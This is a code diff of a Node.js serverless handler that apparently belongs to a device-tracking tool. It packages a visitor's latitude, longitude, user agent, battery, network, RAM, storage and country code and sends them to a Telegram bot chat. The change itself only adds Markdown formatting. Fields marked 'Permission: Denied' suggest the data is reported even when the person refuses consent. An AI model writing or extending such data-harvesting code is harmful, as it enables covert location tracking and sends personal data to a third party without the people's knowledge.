@@ -44,19 +44,19 @@ module.exports = async (req, res) => {
       const now = new Date();
       const dateTime = now.toLocaleString();
       
-      const messageText = `📌 New Data Received:\n\n` +
-        `📍 Latitude: ${latitude}\n` +
-        `📍 Longitude: ${longitude}\n` +
-        `📱 User Agent: ${userAgent || 'Unknown'}\n` +
-        `📅 Date: ${dateTime}\n` +
-        `🌍 Timezone: ${timezone || 'Unknown'}\n` +
-        `🔋 Battery: ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
-        `📶 Network: ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
-        `📞 Selected Number: User Denied\n` +
-        `🌐 Country Code: ${countryCode || 'Unknown'}\n` +
-        `💾 RAM: ${ram || 'Unknown'} GB\n` +
-        `💽 Storage: ${storage || 'Unknown'}\n` +
-        `🔒 Permission: Denied`;
+      const messageText = `*📌 New Data Received:*\n\n` +
+        `*📍 Latitude:* ${latitude}\n` +
+        `*📍 Longitude:* ${longitude}\n` +
+        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
+        `*📅 Date:* ${dateTime}\n` +
+        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
+        `*🔋 Battery:* ${batteryLevel || 'Unknown'}% (${batteryCharging === 'true' ? 'Charging' : 'Not Charging'})\n` +
+        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
+        `*📞 Selected Number:* User Denied\n` +
+        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
+        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
+        `*💽 Storage:* ${storage || 'Unknown'}\n` +
+        `*🔒 Permission:* Denied`;
 
       // First send location
       const locationUrl = `https://api.telegram.org/bot${botToken}/sendLocation`;
@@ -85,7 +85,8 @@ module.exports = async (req, res) => {
       const messageUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
       const messageData = {
         chat_id: chatId,
-        text: messageText
+        text: messageText,
+        parse_mode: 'Markdown'
       };
 
       const messageResponse = await fetch(messageUrl, {
